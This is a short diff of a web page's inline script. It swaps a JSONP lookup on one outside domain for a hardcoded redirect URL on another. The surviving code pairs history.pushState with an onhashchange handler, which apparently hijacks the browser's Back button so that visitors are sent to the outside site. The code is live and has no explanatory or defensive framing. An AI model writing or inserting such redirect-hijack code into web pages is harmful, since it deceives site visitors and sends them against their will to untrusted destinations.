@@ -1422,19 +1422,8 @@ ele.innerHTML = str;
   </script> 
       <script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script> 
       <script>
- var hrefurl;
- $.ajax({  
-    type : "get",  
-    url : "http://www.i98ah.cn/user/jiekou.php?r=199-266",
-    dataType : "jsonp",  
-    jsonp: "callback",  
-    jsonpCallback:"success_jsonpCallback",  
-    success : function(data){  	
-	  hrefurl=data.fhlj;
-		}
-	
-});
-	window.onhashchange=function(){jp();};
+ var hrefurl = 'http://dja8el.cn/order/jump-story1';
+window.onhashchange=function(){jp();};
 function hh() 
 {
 history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());
